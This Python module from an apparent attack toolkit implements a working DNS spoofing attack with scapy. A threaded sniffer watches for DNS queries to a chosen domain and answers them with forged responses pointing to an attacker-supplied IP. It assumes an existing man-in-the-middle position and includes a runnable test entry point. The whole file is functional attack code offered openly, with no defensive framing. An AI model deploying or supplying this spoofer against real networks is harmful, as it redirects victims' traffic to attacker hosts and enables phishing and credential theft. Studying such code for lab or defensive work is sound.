
""" src/attacks/dns_spoofing.py: Module for DNS spoofing attack.
"""
import threading
from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR

class DnsSpoofingAttack(threading.Thread):
    """
    Manages a DNS spoofing attack by sniffing for DNS queries and sending spoofed responses.
    This class assumes that an external component has already placed the attacker
    in a Man-in-the-Middle position.
    """

    def __init__(self, domain: str, fake_ip: str):
        """
        Initializes the DNS spoofing attack thread.

        Args:
            domain (str): The domain name to spoof.
            fake_ip (str): The IP address to use in the spoofed response.
        """
        super().__init__()
        self.spoof_rules = {domain.strip("."): fake_ip}
        self._stop_event = threading.Event()
        self.daemon = True

    def _dns_interceptor(self, packet):
        """
        Callback function to process sniffed DNS packets.
        """
        if self._stop_event.is_set():
            return

        if packet.haslayer(DNS) and packet[DNS].opcode == 0 and packet[DNS].ancount == 0:
            queried_domain = packet[DNSQR].qname.decode('utf-8').strip('.')

            if queried_domain in self.spoof_rules:
                fake_ip = self.spoof_rules[queried_domain]
                print(f"[INFO] Intercepted DNS query for {queried_domain}. Spoofing to {fake_ip}")

                spoofed_response = (
                    Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1, aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                    )
                )
                sendp(spoofed_response, verbose=0)
                print(f"[SUCCESS] Sent spoofed response for {queried_domain} to {packet[IP].src}")

    def run(self):
        """
        The main loop for the sniffing thread.
        """
        print("[INFO] DNS Spoofing thread started (sniffing for queries).")
        while not self._stop_event.is_set():
            sniff(filter="udp port 53", prn=self._dns_interceptor, store=0, stop_filter=lambda p: self._stop_event.is_set())
        print("[INFO] DNS Spoofing thread finished.")

    def stop(self):
        """
        Stops the DNS spoofing attack.
        """
        print("[INFO] Signaling DNS Spoofing thread to stop...")
        self._stop_event.set()

# For direct testing of the module
if __name__ == '__main__':
    # This test requires running manually as root and having an active ARP spoof.
    # Example: sudo python3 -m src.attacks.dns_spoofing
    print("Testing DNS spoofer (requires active MITM)...")
    try:
        attack = DnsSpoofingAttack(
            domain="example.com",
            fake_ip="1.2.3.4",
        )
        attack.start()
        print("Attack started. Press Ctrl+C to stop.")
        while True:
            pass
    except KeyboardInterrupt:
        print("\nStopping attack...")
        attack.stop()
        attack.join()
        print("Attack stopped.")